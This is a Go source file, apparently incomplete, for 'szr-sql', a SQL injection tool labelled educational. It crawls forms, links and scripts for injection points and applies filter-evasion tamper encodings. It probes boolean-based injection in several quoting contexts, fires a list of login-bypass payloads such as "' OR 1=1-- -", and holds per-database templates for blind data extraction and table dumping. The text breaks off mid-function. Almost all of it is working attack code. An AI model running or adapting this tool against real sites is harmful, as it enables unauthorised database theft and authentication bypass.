package main

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	banner = `
  ███████╗███████╗██████╗       ███████╗ ██████╗ ██╗
  ██╔════╝╚══███╔╝██╔══██╗      ██╔════╝██╔═══██╗██║
  ███████╗  ███╔╝ ██████╔╝█████╗███████╗██║   ██║██║
  ╚════██║ ███╔╝  ██╔══██╗╚════╝╚════██║██║▄▄ ██║██║
  ███████║███████╗██║  ██║      ███████║╚██████╔╝███████╗
  ╚══════╝╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
              szr-sql  ·  v1.4  ·  educational only
`
	boolDiffThreshold       = 20
	baselineSamples         = 3
	baselineSleep           = 200 * time.Millisecond
	defaultDBLimit          = 8
	defaultTableLimit       = 15
	defaultColumnLimit      = 25
	defaultRows             = 5
	maxExtractLen           = 64
	maxLenName              = 63
	asciiLow                = 32
	asciiHigh               = 126
	timeShort               = 3
	timeLong                = 6
	timeTolerance           = 0.8
	probeComment            = "-- -"
	maxBodyScan             = 64 * 1024
	maxUnionColumns         = 20
	maxHTMLBytes            = 2 * 1024 * 1024
	defaultPlaceholderValue = "1"
	defaultMaxPoints        = 5
)

var errRateLimited = errors.New("rate limited")

var placeholderRE = regexp.MustCompile(
	`\{\{[a-zA-Z_][a-zA-Z0-9_]*\}\}` +
		`|\{[a-zA-Z_][a-zA-Z0-9_]*\}` +
		`|\[[a-zA-Z_][a-zA-Z0-9_]*\]` +
		`|<[a-zA-Z_][a-zA-Z0-9_]*>`)

var (
	formBlockRE   = regexp.MustCompile(`(?is)<form\b([^>]*)>(.*?)</form>`)
	formActionRE  = regexp.MustCompile(`(?i)action\s*=\s*["']([^"']*)["']`)
	formMethodRE  = regexp.MustCompile(`(?i)method\s*=\s*["']([^"']*)["']`)
	inputBlockRE  = regexp.MustCompile(`(?is)<input\b([^>]*)/?>`)
	inputNameRE   = regexp.MustCompile(`(?i)name\s*=\s*["']([^"']*)["']`)
	inputValueRE  = regexp.MustCompile(`(?i)value\s*=\s*["']([^"']*)["']`)
	inputTypeRE   = regexp.MustCompile(`(?i)type\s*=\s*["']([^"']*)["']`)
	linkBlockRE   = regexp.MustCompile(`(?is)<a\b([^>]*)>`)
	hrefRE        = regexp.MustCompile(`(?i)href\s*=\s*["']([^"']*)["']`)
	scriptBlockRE = regexp.MustCompile(`(?is)<script\b[^>]*>(.*?)</script>`)
	jsFetchRE     = regexp.MustCompile(`(?:fetch|axios\.(?:get|post|put|delete)|\.open)\s*\(\s*["']([^"']+)["']`)
)

type InjectionPoint struct {
	URL    string
	Method string
	Param  string
	Value  string
	Extra  map[string]string
	Kind   string
}

func extractAttr(s string, re *regexp.Regexp) string {
	m := re.FindStringSubmatch(s)
	if len(m) > 1 {
		return m[1]
	}
	return ""
}

func resolveURL(base, ref string) string {
	if ref == "" || strings.HasPrefix(ref, "#") || strings.HasPrefix(ref, "javascript:") || strings.HasPrefix(ref, "mailto:") || strings.HasPrefix(ref, "tel:") || strings.HasPrefix(ref, "data:") || strings.HasPrefix(ref, "ftp:") {
		return ""
	}
	b, err := url.Parse(base)
	if err != nil {
		return ""
	}
	r, err := url.Parse(ref)
	if err != nil {
		return ""
	}
	out := b.ResolveReference(r)
	return out.String()
}

func buildExtraQuery(m map[string]string) string {
	if len(m) == 0 {
		return ""
	}
	var parts []string
	for k, v := range m {
		parts = append(parts, url.QueryEscape(k)+"="+url.QueryEscape(v))
	}
	return strings.Join(parts, "&")
}

func parseForms(baseURL, html string) []InjectionPoint {
	var pts []InjectionPoint
	for _, m := range formBlockRE.FindAllStringSubmatch(html, -1) {
		attrs := m[1]
		inner := m[2]
		action := extractAttr(attrs, formActionRE)
		method := strings.ToUpper(extractAttr(attrs, formMethodRE))
		if method == "" {
			method = "GET"
		}
		if method != "GET" && method != "POST" {
			continue
		}
		absAction := resolveURL(baseURL, action)
		if absAction == "" {
			absAction = baseURL
		}

		type kv struct{ name, value string }
		var inputs []kv
		for _, im := range inputBlockRE.FindAllStringSubmatch(inner, -1) {
			ia := im[1]
			typ := strings.ToLower(extractAttr(ia, inputTypeRE))
			if typ == "submit" || typ == "button" || typ == "reset" || typ == "file" {
				continue
			}
			name := extractAttr(ia, inputNameRE)
			if name == "" {
				continue
			}
			inputs = append(inputs, kv{name, extractAttr(ia, inputValueRE)})
		}
		for _, inp := range inputs {
			extra := map[string]string{}
			for _, other := range inputs {
				if other.name != inp.name {
					extra[other.name] = other.value
				}
			}
			pts = append(pts, InjectionPoint{
				URL: absAction, Method: method,
				Param: inp.name, Value: inp.value,
				Extra: extra, Kind: "form",
			})
		}
	}
	return pts
}

func parseLinks(baseURL, html string) []InjectionPoint {
	var pts []InjectionPoint
	for _, m := range linkBlockRE.FindAllStringSubmatch(html, -1) {
		href := extractAttr(m[1], hrefRE)
		abs := resolveURL(baseURL, href)
		if abs == "" {
			continue
		}
		u, err := url.Parse(abs)
		if err != nil {
			continue
		}
		for k, vv := range u.Query() {
			if len(vv) == 0 {
				continue
			}
			extra := map[string]string{}
			for k2, vv2 := range u.Query() {
				if k2 != k && len(vv2) > 0 {
					extra[k2] = vv2[0]
				}
			}
			pts = append(pts, InjectionPoint{
				URL: abs, Method: "GET",
				Param: k, Value: vv[0],
				Extra: extra, Kind: "link",
			})
		}
	}
	return pts
}

func parseScripts(baseURL, html string) []InjectionPoint {
	var pts []InjectionPoint
	for _, m := range scriptBlockRE.FindAllStringSubmatch(html, -1) {
		js := m[1]
		for _, fm := range jsFetchRE.FindAllStringSubmatch(js, -1) {
			abs := resolveURL(baseURL, fm[1])
			if abs == "" {
				continue
			}
			u, err := url.Parse(abs)
			if err != nil {
				continue
			}
			for k, vv := range u.Query() {
				if len(vv) == 0 {
					continue
				}
				extra := map[string]string{}
				for k2, vv2 := range u.Query() {
					if k2 != k && len(vv2) > 0 {
						extra[k2] = vv2[0]
					}
				}
				pts = append(pts, InjectionPoint{
					URL: abs, Method: "GET",
					Param: k, Value: vv[0],
					Extra: extra, Kind: "script",
				})
			}
		}
	}
	return pts
}

func discoverInjectionPoints(ctx context.Context, rawURL, cookie string, cfg Config, timeout int, verbose bool) ([]InjectionPoint, error) {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: cfg.Insecure}}
	if cfg.ProxyURL != "" {
		if pu, err := url.Parse(cfg.ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	defer tr.CloseIdleConnections()
	client := &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "szr-sql/1.4 (educational)")
	if cookie != "" {
		req.Header.Set("Cookie", cookie)
	}
	for k, v := range cfg.Headers {
		req.Header.Set(k, v)
	}
	if cfg.AuthBearer != "" {
		req.Header.Set("Authorization", "Bearer "+cfg.AuthBearer)
	} else if cfg.AuthUser != "" {
		req.SetBasicAuth(cfg.AuthUser, cfg.AuthPass)
	}

	if verbose {
		fmt.Printf("    → discovery GET %s\n", rawURL)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, maxHTMLBytes))
	html := string(body)

	var pts []InjectionPoint
	pts = append(pts, parseForms(rawURL, html)...)
	pts = append(pts, parseLinks(rawURL, html)...)
	pts = append(pts, parseScripts(rawURL, html)...)

	seen := map[string]bool{}
	var uniq []InjectionPoint
	for _, p := range pts {
		key := p.Method + "|" + p.URL + "|" + p.Param
		if seen[key] {
			continue
		}
		seen[key] = true
		uniq = append(uniq, p)
	}
	return uniq, nil
}

type Tamper interface {
	Apply(string) string
	Name() string
}

type space2comment struct{}

func (space2comment) Apply(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] != ' ' {
			b.WriteByte(s[i])
			continue
		}
		prev := ""
		if i >= 2 {
			prev = s[i-2 : i]
		}
		next := ""
		if i+2 <= len(s) {
			next = s[i : i+2]
		} else if i+1 <= len(s) {
			next = s[i : i+1]
		}
		if prev == "--" || strings.HasPrefix(next, "--") || strings.HasPrefix(next, "#") {
			b.WriteByte(' ')
		} else {
			b.WriteString("/**/")
		}
	}
	return b.String()
}
func (space2comment) Name() string { return "space2comment" }

type randomcase struct{}

func (randomcase) Apply(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			if i%2 == 0 {
				b.WriteByte(c &^ 0x20)
			} else {
				b.WriteByte(c | 0x20)
			}
		} else {
			b.WriteByte(c)
		}
	}
	return b.String()
}
func (randomcase) Name() string { return "randomcase" }

type charencode struct{}

func (charencode) Apply(s string) string {
	var b strings.Builder
	for _, c := range s {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') {
			b.WriteString(fmt.Sprintf("%%%02X", c))
		} else if c == ' ' {
			b.WriteString("%20")
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}
func (charencode) Name() string { return "charencode" }

type urlencode struct{}

func (urlencode) Apply(s string) string { return url.QueryEscape(s) }
func (urlencode) Name() string          { return "urlencode" }

var tamperRegistry = map[string]Tamper{
	"space2comment": space2comment{},
	"randomcase":    randomcase{},
	"charencode":    charencode{},
	"urlencode":     urlencode{},
}

type Profile struct {
	Name, Sleep, Substr, Ascii, Length, Comment string
	FromSchema, FromTables, FromColumns         string
	TablesQuery, ColumnsQuery                   string
	HexExpr                                     string
}

var profiles = map[string]Profile{
	"mysql": {
		Name: "mysql", Sleep: "SLEEP({d})",
		Substr: "SUBSTR(({q}),{p},1)", Ascii: "ASCII({s})", Length: "LENGTH(({q}))",
		Comment:    "-- -",
		FromSchema: "information_schema.schemata", FromTables: "information_schema.tables", FromColumns: "information_schema.columns",
		HexExpr: "HEX((%s))",
	},
	"postgresql": {
		Name: "postgresql", Sleep: "pg_sleep({d})",
		Substr: "SUBSTR(({q}),{p},1)", Ascii: "ASCII({s})", Length: "LENGTH(({q}))",
		Comment:    "--",
		FromSchema: "information_schema.schemata", FromTables: "information_schema.tables", FromColumns: "information_schema.columns",
		HexExpr: "encode(convert_to((%s)::text,'UTF8'),'hex')",
	},
	"mssql": {
		Name: "mssql", Sleep: "",
		Substr: "SUBSTRING(({q}),{p},1)", Ascii: "ASCII({s})", Length: "LEN(({q}))",
		Comment:    "--",
		FromSchema: "information_schema.schemata", FromTables: "information_schema.tables", FromColumns: "information_schema.columns",
		HexExpr: "CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),(%s)),2)",
	},
	"sqlite": {
		Name: "sqlite", Sleep: "",
		Substr: "SUBSTR(({q}),{p},1)", Ascii: "UNICODE({s})", Length: "LENGTH(({q}))",
		Comment:     "--",
		FromSchema:  "sqlite_master",
		FromTables:  "sqlite_master",
		FromColumns: "sqlite_master",
		HexExpr:     "hex((%s))",
	},
}

var dbmsErrorSignatures = map[string][]string{
	"mysql":      {"you have an error in your sql syntax", "mysql_fetch", "mysqli", "check the manual that corresponds"},
	"postgresql": {"pg_query", "postgresql", "psql:", "unterminated quoted string", "syntax error at or near"},
	"mssql":      {"microsoft ole db", "sql server", "unclosed quotation mark", "incorrect syntax near"},
	"sqlite":     {"sqlite", "sql logic error", "unrecognized token:", "no such table:", "no such column:", "no such function:", `near "`, "datatype mismatch"},
}

type Result struct {
	Target    TargetInfo            `json:"target"`
	Detect    DetectInfo            `json:"detection"`
	DBMS      DBMSInfo              `json:"dbms"`
	Databases []string              `json:"databases,omitempty"`
	Tables    map[string][]string   `json:"tables,omitempty"`
	Columns   map[string][]string   `json:"columns,omitempty"`
	Dumps     map[string][][]string `json:"dumps,omitempty"`
	StartedAt time.Time             `json:"started_at"`
	EndedAt   time.Time             `json:"ended_at,omitempty"`
	Duration  string                `json:"duration,omitempty"`
	Stats     Stats                 `json:"stats,omitempty"`
}

type TargetInfo struct {
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Param       string            `json:"param"`
	Placeholder string            `json:"placeholder,omitempty"`
	Extra       map[string]string `json:"extra,omitempty"`
}

type DetectInfo struct {
	BaselineSec  float64 `json:"baseline_sec"`
	TimeBased    bool    `json:"time_based"`
	BooleanBased bool    `json:"boolean_based"`
	ErrorBased   bool    `json:"error_based"`
	UnionBased   bool    `json:"union_based"`
	AuthBypass   bool    `json:"auth_bypass,omitempty"`
	Vulnerable   bool    `json:"vulnerable"`
}

type DBMSInfo struct {
	Name    string `json:"name"`
	Version string `json:"version"`
}

type Stats struct {
	Requests int64 `json:"requests"`
	Errors   int64 `json:"errors"`
}

type Scope struct {
	Allow []string
	Deny  []string
}

func hostMatch(host, pattern string) bool {
	host = strings.ToLower(host)
	pattern = strings.ToLower(pattern)
	if host == pattern {
		return true
	}
	return strings.HasSuffix(host, "."+pattern)
}

func (s Scope) Check(rawURL string) error {
	u, err := url.Parse(rawURL)
	if err != nil {
		return err
	}
	host := u.Host
	if idx := strings.Index(host, ":"); idx >= 0 {
		host = host[:idx]
	}
	for _, d := range s.Deny {
		if d != "" && hostMatch(host, d) {
			return fmt.Errorf("hedef deny-list'te: %s", host)
		}
	}
	if len(s.Allow) > 0 {
		for _, a := range s.Allow {
			if a != "" && hostMatch(host, a) {
				return nil
			}
		}
		return fmt.Errorf("hedef allow-list'te değil: %s", host)
	}
	return nil
}

type Session struct {
	Result     *Result   `json:"result"`
	LastUpdate time.Time `json:"last_update"`
}

func loadSession(path string) (*Session, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var s Session
	if err := json.Unmarshal(data, &s); err != nil {
		return nil, err
	}
	return &s, nil
}

func saveSession(path string, r *Result) error {
	s := Session{Result: r, LastUpdate: time.Now()}
	data, err := json.MarshalIndent(s, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0644)
}

type Config struct {
	ProxyURL        string            `json:"proxy,omitempty"`
	Insecure        bool              `json:"insecure,omitempty"`
	MaxRPS          int               `json:"max_rps,omitempty"`
	AuthUser        string            `json:"auth_user,omitempty"`
	AuthPass        string            `json:"auth_pass,omitempty"`
	AuthBearer      string            `json:"auth_bearer,omitempty"`
	Headers         map[string]string `json:"headers,omitempty"`
	UserAgent       string            `json:"user_agent,omitempty"`
	Referer         string            `json:"referer,omitempty"`
	Delay           time.Duration     `json:"delay,omitempty"`
	Randomize       bool              `json:"randomize,omitempty"`
	Retries         int               `json:"retries,omitempty"`
	DBMSForce       string            `json:"dbms,omitempty"`
	StringTrue      string            `json:"string_true,omitempty"`
	StringFalse     string            `json:"string_false,omitempty"`
	Batch           bool              `json:"batch,omitempty"`
	OutputDir       string            `json:"output_dir,omitempty"`
	SessionFile     string            `json:"session_file,omitempty"`
	Techniques      map[string]bool   `json:"techniques,omitempty"`
	TotalTimeout    time.Duration     `json:"total_timeout,omitempty"`
	HexExtract      bool              `json:"hex_extract,omitempty"`
	FollowRedirects bool              `json:"follow_redirects,omitempty"`
	TamperChain     []string          `json:"tamper_chain,omitempty"`
	Placeholder     string            `json:"placeholder,omitempty"`
	AutoDiscover    bool              `json:"auto_discover,omitempty"`
	MaxPoints       int               `json:"max_points,omitempty"`
	ScopeAllow      []string          `json:"scope_allow,omitempty"`
	ScopeDeny       []string          `json:"scope_deny,omitempty"`
}

type Injector struct {
	ctx    context.Context
	cancel context.CancelFunc
	tcancel context.CancelFunc

	client                       *http.Client
	baseURL, baseURLHost         string
	method, param, value, cookie string
	extraQuery, postData         url.Values
	verbose                      bool
	threads                      int
	baseline                     time.Duration
	trueRef, falseRef            []byte
	trueHash, falseHash          [32]byte
	profile                      Profile
	result                       *Result
	cfg                          Config
	tamperChain                  []Tamper

	placeholder        string
	urlPathTemplate    string
	urlQueryTemplate   string
	placeholderInPath  bool
	useTime            bool
	injPrefix          string
	injSuffix          string
	authBypassOnly     bool

	mu        sync.Mutex
	printMu   sync.Mutex
	sem       chan struct{}
	ticker    *time.Ticker
	rateCh    <-chan time.Time
	rlAtomic  atomic.Bool
	processed sync.Map
	stats     Stats
}

func findPlaceholder(s string) string { return placeholderRE.FindString(s) }

func detectPlaceholder(u *url.URL, extra url.Values) (string, bool) {
	if ph := findPlaceholder(u.Path); ph != "" {
		return ph, true
	}
	if ph := findPlaceholder(u.RawQuery); ph != "" {
		return ph, false
	}
	for _, vv := range extra {
		for _, v := range vv {
			if ph := findPlaceholder(v); ph != "" {
				return ph, false
			}
		}
	}
	return "", false
}

func NewInjector(parent context.Context, rawURL, method, data, extra, cookie, paramSel string, timeout, threads int, verbose bool) (*Injector, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	if threads < 1 {
		threads = 1
	}
	extraQuery := cloneValues(u.Query())
	postData := url.Values{}

	if data != "" {
		if postData, err = url.ParseQuery(data); err != nil {
			return nil, fmt.Errorf("POST data: %w", err)
		}
		if method == "" {
			method = "POST"
		}
	}
	if method == "" {
		method = "GET"
	}
	method = strings.ToUpper(method)
	if method != "GET" && method != "POST" {
		return nil, fmt.Errorf("desteklenmeyen method: %s", method)
	}
	if extra != "" {
		e, err := url.ParseQuery(extra)
		if err != nil {
			return nil, fmt.Errorf("extra: %w", err)
		}
		for k, vv := range e {
			for _, v := range vv {
				extraQuery.Add(k, v)
			}
		}
	}

	var param, value, placeholder, urlQueryTemplate string
	var placeholderInPath bool

	if paramSel != "" {
		param = paramSel
		if v, ok := extraQuery[paramSel]; ok && len(v) > 0 {
			value = v[0]
			delete(extraQuery, paramSel)
		} else if v, ok := postData[paramSel]; ok && len(v) > 0 {
			value = v[0]
			delete(postData, paramSel)
		} else {
			return nil, fmt.Errorf("parametre bulunamadı: %s", paramSel)
		}
	} else if ph, inPath := detectPlaceholder(u, extraQuery); ph != "" {
		placeholder = ph
		placeholderInPath = inPath
		value = defaultPlaceholderValue
		for k, vv := range extraQuery {
			if k == ph {
				delete(extraQuery, k)
				continue
			}
			if len(vv) > 0 && vv[0] == ph {
				delete(extraQuery, k)
			}
		}
		if !inPath {
			urlQueryTemplate = u.RawQuery
			for k := range u.Query() {
				delete(extraQuery, k)
			}
		}
		fmt.Printf("[i] placeholder: %s (path=%v)\n", ph, inPath)
	} else {
		if method == "POST" && len(postData) > 0 {
			for k, v := range postData {
				param, value = k, v[0]
				delete(postData, k)
				break
			}
		}
		if param == "" {
			for k, v := range extraQuery {
				param, value = k, v[0]
				delete(extraQuery, k)
				break
			}
		}
		if param == "" {
			return nil, fmt.Errorf("enjeksiyon noktası yok")
		}
	}

	ctx, cancel := context.WithCancel(parent)

	extraMap := map[string]string{}
	for k, v := range extraQuery {
		if len(v) > 0 {
			extraMap[k] = v[0]
		}
	}

	res := &Result{
		Target: TargetInfo{
			URL: rawURL, Method: method, Param: param,
			Placeholder: placeholder, Extra: extraMap,
		},
		Tables:    map[string][]string{},
		Columns:   map[string][]string{},
		Dumps:     map[string][][]string{},
		StartedAt: time.Now(),
	}

	inj := &Injector{
		ctx: ctx, cancel: cancel,
		baseURL:     u.Scheme + "://" + u.Host + u.Path,
		baseURLHost: u.Scheme + "://" + u.Host,
		method:      method, param: param, value: value,
		extraQuery: extraQuery, postData: postData, cookie: cookie,
		verbose: verbose, threads: threads,
		result:            res,
		sem:               make(chan struct{}, threads),
		placeholder:       placeholder,
		urlPathTemplate:   u.Path,
		urlQueryTemplate:  urlQueryTemplate,
		placeholderInPath: placeholderInPath,
	}
	inj.client = inj.buildClient(timeout)
	return inj, nil
}

func (i *Injector) buildClient(timeout int) *http.Client {
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: i.cfg.Insecure},
		MaxIdleConns:        i.threads * 2,
		MaxIdleConnsPerHost: i.threads * 2,
		IdleConnTimeout:     90 * time.Second,
	}
	if i.cfg.ProxyURL != "" {
		if pu, err := url.Parse(i.cfg.ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	return &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if i.cfg.FollowRedirects {
				return nil
			}
			return http.ErrUseLastResponse
		},
	}
}

func (i *Injector) ApplyConfig(cfg Config) {
	i.cfg = cfg
	switch cfg.Placeholder {
	case "", "auto":
	case "none":
		i.placeholder = ""
		i.result.Target.Placeholder = ""
	default:
		i.placeholder = cfg.Placeholder
		i.result.Target.Placeholder = cfg.Placeholder
		if strings.Contains(i.urlPathTemplate, cfg.Placeholder) {
			i.placeholderInPath = true
		} else if i.urlQueryTemplate != "" && strings.Contains(i.urlQueryTemplate, cfg.Placeholder) {
			i.placeholderInPath = false
		} else {
			u := i.baseURLHost + i.urlPathTemplate
			qIdx := strings.Index(u, "?")
			phIdx := strings.Index(u, cfg.Placeholder)
			i.placeholderInPath = qIdx < 0 || phIdx < qIdx
		}
	}
	if cfg.MaxRPS > 0 {
		i.ticker = time.NewTicker(time.Second / time.Duration(cfg.MaxRPS))
		i.rateCh = i.ticker.C
	}
	for _, name := range cfg.TamperChain {
		if t, ok := tamperRegistry[name]; ok {
			i.tamperChain = append(i.tamperChain, t)
		}
	}
}

func (i *Injector) Close() {
	if i.tcancel != nil {
		i.tcancel()
	}
	if i.ticker != nil {
		i.ticker.Stop()
	}
	if i.client != nil {
		if tr, ok := i.client.Transport.(*http.Transport); ok && tr != nil {
			tr.CloseIdleConnections()
		}
	}
	i.cancel()
}

func (i *Injector) logf(f string, a ...any) {
	i.printMu.Lock()
	defer i.printMu.Unlock()
	fmt.Printf(f, a...)
}

func (i *Injector) hasTransportTamper() bool {
	for _, t := range i.tamperChain {
		if t.Name() == "urlencode" || t.Name() == "charencode" {
			return true
		}
	}
	return false
}

func isRateLimitResponse(code int, body []byte) bool {
	if code == 429 || code == 503 {
		return true
	}
	if code >= 200 && code < 300 && len(body) > 0 {
		s := strings.ToLower(string(body))
		if len(s) > maxBodyScan {
			s = s[:maxBodyScan]
		}
		for _, p := range []string{
			"too many requests", "rate limit exceeded", "rate-limit exceeded",
			"please slow down", "captcha required",
		} {
			if strings.Contains(s, p) {
				return true
			}
		}
	}
	return false
}

func (i *Injector) applyHeaders(req *http.Request) {
	for k, v := range i.cfg.Headers {
		req.Header.Set(k, v)
	}
	ua := i.cfg.UserAgent
	if ua == "" {
		ua = "szr-sql/1.4 (educational)"
	}
	req.Header.Set("User-Agent", ua)
	if i.cfg.Referer != "" {
		req.Header.Set("Referer", i.cfg.Referer)
	}
	if i.cookie != "" {
		req.Header.Set("Cookie", i.cookie)
	}
	if i.cfg.AuthBearer != "" {
		req.Header.Set("Authorization", "Bearer "+i.cfg.AuthBearer)
	} else if i.cfg.AuthUser != "" {
		req.SetBasicAuth(i.cfg.AuthUser, i.cfg.AuthPass)
	}
}

func (i *Injector) sendOnce(payload string) ([]byte, time.Duration, error) {
	var req *http.Request
	var err error
	transportTampered := i.hasTransportTamper()

	if i.placeholder != "" {
		var encoded string
		if transportTampered {
			encoded = payload
		} else if i.placeholderInPath {
			encoded = url.PathEscape(payload)
		} else {
			encoded = url.QueryEscape(payload)
		}

		var reqURL string
		if i.placeholderInPath {
			path := strings.ReplaceAll(i.urlPathTemplate, i.placeholder, encoded)
			reqURL = i.baseURLHost + path
			if len(i.extraQuery) > 0 {
				reqURL += "?" + i.extraQuery.Encode()
			}
		} else {
			base := i.urlQueryTemplate
			if base == "" {
				base = i.urlPathTemplate
			}
			newQuery := strings.ReplaceAll(base, i.placeholder, encoded)
			reqURL = i.baseURL + "?" + newQuery
			if len(i.extraQuery) > 0 {
				reqURL += "&" + i.extraQuery.Encode()
			}
		}
		var body io.Reader
		if i.method == "POST" && len(i.postData) > 0 {
			body = strings.NewReader(i.postData.Encode())
		}
		req, err = http.NewRequestWithContext(i.ctx, i.method, reqURL, body)
		if err != nil {
			return nil, 0, err
		}
		if body != nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	} else if i.method == "POST" {
		var bodyStr string
		if transportTampered {
			var parts []string
			for k, vv := range i.postData {
				for _, v := range vv {
					parts = append(parts, url.QueryEscape(k)+"="+url.QueryEscape(v))
				}
			}
			parts = append(parts, url.QueryEscape(i.param)+"="+payload)
			bodyStr = strings.Join(parts, "&")
		} else {
			bd := cloneValues(i.postData)
			bd.Set(i.param, payload)
			bodyStr = bd.Encode()
		}
		reqURL := i.baseURL
		if len(i.extraQuery) > 0 {
			reqURL += "?" + i.extraQuery.Encode()
		}
		req, err = http.NewRequestWithContext(i.ctx, "POST", reqURL, strings.NewReader(bodyStr))
		if err != nil {
			return nil, 0, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		var reqURL string
		if transportTampered {
			var parts []string
			for k, vv := range i.extraQuery {
				for _, v := range vv {
					parts = append(parts, url.QueryEscape(k)+"="+url.QueryEscape(v))
				}
			}
			parts = append(parts, url.QueryEscape(i.param)+"="+payload)
			reqURL = i.baseURL + "?" + strings.Join(parts, "&")
		} else {
			q := cloneValues(i.extraQuery)
			q.Set(i.param, payload)
			reqURL = i.baseURL + "?" + q.Encode()
		}
		req, err = http.NewRequestWithContext(i.ctx, "GET", reqURL, nil)
		if err != nil {
			return nil, 0, err
		}
	}
	i.applyHeaders(req)

	start := time.Now()
	resp, err := i.client.Do(req)
	elapsed := time.Since(start)
	if err != nil {
		return nil, elapsed, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	atomic.AddInt64(&i.stats.Requests, 1)

	if isRateLimitResponse(resp.StatusCode, body) {
		i.rlAtomic.Store(true)
		return body, elapsed, errRateLimited
	}

	if i.verbose {
		i.logf("    → [%s] %q  (%d byte, %.2fs)\n",
			i.method, truncate(payload, 60), len(body), elapsed.Seconds())
	}
	return body, elapsed, nil
}

func (i *Injector) send(payload string) ([]byte, time.Duration, error) {
	if i.rlAtomic.Load() {
		return nil, 0, errRateLimited
	}
	i.sem <- struct{}{}
	defer func() { <-i.sem }()

	if i.rateCh != nil {
		select {
		case <-i.rateCh:
		case <-i.ctx.Done():
			return nil, 0, i.ctx.Err()
		}
	}
	if i.cfg.Delay > 0 {
		d := i.cfg.Delay
		if i.cfg.Randomize {
			d = time.Duration(float64(d) * (0.5 + rand.Float64()))
		}
		select {
		case <-time.After(d):
		case <-i.ctx.Done():
			return nil, 0, i.ctx.Err()
		}
	}

	var lastErr error
	retries := i.cfg.Retries
	if retries < 0 {
		retries = 0
	}
	for attempt := 0; attempt <= retries; attempt++ {
		body, elapsed, err := i.sendOnce(payload)
		if err == nil {
			return body, elapsed, nil
		}
		lastErr = err
		atomic.AddInt64(&i.stats.Errors, 1)
		if errors.Is(err, errRateLimited) || errors.Is(err, context.Canceled) || errors.Is(err, context.DeadlineExceeded) {
			return body, elapsed, err
		}
		select {
		case <-time.After(500 * time.Millisecond):
		case <-i.ctx.Done():
			return nil, 0, i.ctx.Err()
		}
	}
	return nil, 0, lastErr
}

func (i *Injector) transform(payload string) string {
	for _, t := range i.tamperChain {
		payload = t.Apply(payload)
	}
	return payload
}

func (i *Injector) sendSQL(payload string) ([]byte, time.Duration, error) {
	return i.send(i.transform(payload))
}

func (i *Injector) condPayload(cond string) string {
	return i.value + i.injPrefix + " AND " + cond + i.injSuffix
}

func (i *Injector) DetectContextAndBoolean() bool {
	candidates := []struct{ name, prefix, suffix string }{
		{"int", "", "-- -"},
		{"int-p", ")", "-- -"},
		{"str", "'", "-- -"},
		{"str-p", "')", "-- -"},
		{"dq", "\"", "-- -"},
	}
	for _, c := range candidates {
		if i.rlAtomic.Load() {
			return false
		}
		tb, _, err := i.sendSQL(i.value + c.prefix + " AND 1=1" + c.suffix)
		if err != nil {
			continue
		}
		fb, _, err := i.sendSQL(i.value + c.prefix + " AND 1=2" + c.suffix)
		if err != nil {
			continue
		}
		d := abs(len(tb) - len(fb))
		i.logf("[bool %-5s] diff=%d (t=%d f=%d)\n", c.name, d, len(tb), len(fb))
		if d > boolDiffThreshold {
			i.injPrefix, i.injSuffix = c.prefix, c.suffix
			i.trueRef, i.falseRef = tb, fb
			i.trueHash = sha256.Sum256(tb)
			i.falseHash = sha256.Sum256(fb)
			i.mu.Lock()
			i.result.Detect.BooleanBased = true
			i.mu.Unlock()
			i.logf("[bool] ✓ context=%s\n", c.name)
			return true
		}
	}
	return false
}

func (i *Injector) DetectAuthBypass() bool {
	baseBody, _, err := i.send(i.value)
	if err != nil {
		return false
	}
	baseLen := len(baseBody)

	payloads := []string{
		"admin'--",
		"admin'-- -",
		"admin'#",
		"admin' OR '1'='1",
		"admin' OR 1=1-- -",
		"' OR '1'='1",
		"' OR 1=1-- -",
		"' OR 1=1#",
	}
	for _, p := range payloads {
		if i.rlAtomic.Load() {
			return false
		}
		body, _, err := i.send(p)
		if err != nil {
			continue
		}
		d := abs(len(body) - baseLen)
		if i.verbose {
			i.logf("  [auth-bypass] %-22q diff=%d\n", p, d)
		}
		if d > boolDiffThreshold*2 {
			i.injPrefix, i.injSuffix = "'", "-- -"
			i.mu.Lock()
			i.result.Detect.AuthBypass = true
			i.mu.Unlock()
			i.logf("[auth-bypass] ✓ payload=%q diff=%d\n", p, d)
			return true
		}
	}
	return false
}

func (i *Injector) MeasureBaseline(samples int) error {
	var total time.Duration
	for s := 0; s < samples; s++ {
